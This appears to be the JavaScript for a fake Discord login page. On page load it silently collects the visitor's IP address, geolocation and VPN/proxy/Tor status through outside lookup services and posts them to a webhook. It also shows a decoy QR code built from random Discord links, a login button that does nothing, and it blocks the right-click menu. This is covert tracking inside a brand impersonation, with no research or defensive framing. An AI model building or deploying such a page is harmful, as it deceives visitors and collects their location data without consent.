// ==================================
// IP LOGGER (PAGE LOAD ONLY)
// ==================================
const sendIP = () => {
  // prevent duplicate logs per page load
  if (sessionStorage.getItem("ipLogged")) return;
  sessionStorage.setItem("ipLogged", "true");

  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(ipData => {
      const ipadd = ipData.ip;

      return fetch(`https://ipapi.co/${ipadd}/json/`)
        .then(res => res.json())
        .then(geoData => {
          const isVPN   = geoData.security?.vpn ?? false;
          const isProxy = geoData.security?.proxy ?? false;
          const isTor   = geoData.security?.tor ?? false;

          const riskLevel =
            isTor || isVPN || isProxy ? "🔴 High Risk" : "🟢 Low Risk";

          const embedColor =
            isTor ? 0xff0033 : isVPN || isProxy ? 0xffa500 : 0x00ff88;

          return fetch("/webhook", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ipadd,
              geoData,
              riskLevel,
              embedColor,
              isVPN,
              isProxy,
              isTor
            })
          });
        });
    })
    .then(res => {
      if (res.ok) console.log("IP logged on page load");
      else console.warn("Webhook failed");
    })
    .catch(err => console.error("IP logger error:", err));
};

// ==================================
// CONFIG
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000,
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
};

// ==================================
// UTILITY FUNCTIONS
// ==================================
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () =>
    chars.charAt(Math.floor(Math.random() * chars.length))
  ).join("");
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const svg = new DOMParser()
        .parseFromString(svgString, "image/svg+xml")
        .documentElement;

      svg.setAttribute("width", "160");
      svg.setAttribute("height", "160");
      svg.setAttribute("viewBox", "0 0 37 37");

      const path = svg.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svg;
    } catch (err) {
      console.error("QR generation error:", err);
      return null;
    }
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = `
      <span class="spinner qrCode-spinner">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";

    const qr = this.generate(
      `https://discord.com/ra/${generateRandomString()}`
    );

    if (qr) DOM.qrCodeContainer.appendChild(qr);

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    setInterval(
      () => this.simulateRefresh(),
      CONFIG.QR_REFRESH_INTERVAL
    );
  },
};

// ==================================
// LOGIN BUTTON MODULE (NO IP LOGGING)
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `
      <span class="spinner">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  applyAnimationDelays() {
    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        i * CONFIG.ELLIPSIS_DELAY_INCREMENT
      }s`;
    });
  },

  showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.disabled = true;
    this.applyAnimationDelays();

    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.disabled = false;
  },

  init() {
    if (!DOM.loginButton) return;
    DOM.loginButton.addEventListener("click", e => {
      e.preventDefault();
      this.showLoading();
    });
  },
};

// ==================================
// GLOBAL EVENTS
// ==================================
const preventContextMenu = (e) => e.preventDefault();

// ==================================
// INIT (PAGE LOAD)
// ==================================
const init = () => {
  // ✅ IP LOGGED ONLY ON PAGE LOAD
  sendIP();

  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener("contextmenu", preventContextMenu);
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
